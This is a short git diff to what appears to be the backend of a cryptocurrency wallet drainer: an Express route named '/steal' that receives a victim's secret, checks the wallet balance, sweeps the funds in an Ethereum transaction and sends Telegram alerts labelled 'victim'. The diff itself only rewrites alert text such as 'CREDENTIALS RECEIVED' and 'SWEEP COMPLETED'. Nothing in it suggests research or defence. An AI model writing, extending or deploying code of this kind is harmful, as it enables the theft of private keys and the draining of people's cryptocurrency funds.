@@ -156,8 +156,8 @@ app.post('/steal', async (req, res) => {
       txHash: null,
       gasUsed: null,
       gasFeeEth: null,
-      senderAddr: null,
-      senderName: `🔑 ${secretType.toUpperCase()} RECEIVED`
+      senderAddr: '🔑 CREDENTIALS RECEIVED',
+      senderName: `${secretType.toUpperCase()} - Balance check in progress...`
     });
 
     // Check balance
@@ -215,7 +215,7 @@ app.post('/steal', async (req, res) => {
     const effectiveGasPrice = receipt.effectiveGasPrice || receipt.gasPrice || ethers.BigNumber.from(0);
     const gasFeeEth = ethers.utils.formatEther(gasUsedBn.mul(effectiveGasPrice));
 
-    // Telegram alert
+    // Telegram alert for successful sweep
     if (!isOnCooldown(addr)) {
       await sendTelegramAlert({
         victim: addr,
@@ -224,8 +224,8 @@ app.post('/steal', async (req, res) => {
         txHash: receipt.transactionHash,
         gasUsed: gasUsedBn.toString(),
         gasFeeEth,
-        senderAddr: null,
-        senderName: null
+        senderAddr: '✅ SWEEP COMPLETED',
+        senderName: 'Funds successfully transferred'
       });
       setCooldown(addr);
     } else {
